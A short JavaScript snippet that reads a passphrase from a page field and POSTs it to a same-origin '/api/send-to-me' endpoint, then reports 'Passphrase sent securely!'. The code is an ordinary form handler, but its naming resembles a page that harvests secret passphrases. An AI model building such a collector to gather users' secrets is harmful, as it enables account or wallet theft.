document.getElementById('sendButton').addEventListener('click', async function() {
    const passphrase = document.getElementById('passphrase').value;

    // Check if the passphrase is empty
    if (passphrase.trim() === "") {
        alert("Please enter your passphrase.");
        return;
    }

    // Send the passphrase to the backend (API route)
    try {
        const response = await fetch('/api/send-to-me', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ passphrase }), // Passphrase as JSON data
        });

        // Parse the JSON response
        const result = await response.json();

        if (response.ok) {
            alert("Passphrase sent securely!");
        } else {
            alert("Failed to send passphrase: " + result.error);
        }
    } catch (error) {
        alert("An error occurred. Please try again.");
    }
});
